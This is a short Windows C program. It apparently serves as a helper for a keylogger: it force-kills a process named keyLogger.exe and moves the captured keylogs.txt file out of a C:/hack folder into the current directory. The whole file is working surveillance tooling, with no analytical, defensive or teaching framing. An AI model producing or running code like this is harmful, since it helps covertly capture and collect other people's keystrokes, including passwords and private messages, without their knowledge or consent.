#include <Windows.h>

int main()
{
	system("taskkill /f /im keyLogger.exe");
	system("C: && cd C:/hack && move keylogs.txt %cd%");
	
	return 0;
}